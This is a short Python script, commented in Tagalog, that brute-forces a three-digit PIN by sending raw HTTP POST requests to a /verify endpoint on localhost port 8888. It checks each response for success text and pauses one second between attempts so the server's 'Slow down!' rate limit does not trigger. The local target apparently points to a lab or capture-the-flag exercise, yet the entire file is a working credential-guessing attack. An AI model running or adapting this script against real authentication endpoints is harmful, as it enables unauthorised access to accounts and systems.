import socket
import time
import re

HOST = '127.0.0.1'
PORT = 8888

def send_request(pin):
    body = f"magicNumber={pin}"
    headers = (
        "POST /verify HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "User-Agent: BruteForceClient/1.0\r\n"
        "Accept: text/html\r\n"
        "\r\n"
    )
    request = headers + body

    with socket.create_connection((HOST, PORT)) as sock:
        sock.sendall(request.encode())
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    return response.decode(errors='ignore')

def clean_html(text):
    """Alisin ang lahat ng HTML tags at kunin ang malinis na teksto lamang."""
    # Aalisin lang yung HTTP headers (kung anumang nasa unahan bago ang unang <body> tag)
    body_start = text.lower().find('<body>')
    if body_start != -1:
        text = text[body_start:] 

    # Aalisin lang ang nilalaman ng <script> at <style>
    text = re.sub(r'<(script|style).*?>.*?</\1>', '', text, flags=re.DOTALL)
    
    text = re.sub(r'<[^>]+>', '', text)
    
    text = re.sub(r'\s+', ' ', text)
    return text.strip()

def brute_force():
    for i in range(1000):
        pin = f"{i:03}"
        print(f"Sinusubukang PIN: {pin}")

        raw_response = send_request(pin)
        message = clean_html(raw_response)

        # Ipapakita lang yung unang 100 characters para sa debugging
        print(f"Sabi ng server: {message[:100]}")

        if "Incorrect number" in message:
            pass  # Mali pa rin
        elif "Correct" in message or "Success" in message or "Welcome" in message:
            print(f"\n✅ Tagumpay! Ang tamang PIN ay: {pin}")
            break
        else:
            print(f"⚠️ Hindi inaasahang tugon para sa PIN {pin}")
            print(f"Buong mensahe mula sa server: {message}\n")  

        time.sleep(1)  # 1 sec delay para hindi sabihing "Slow down!"

if __name__ == "__main__":
    brute_force()
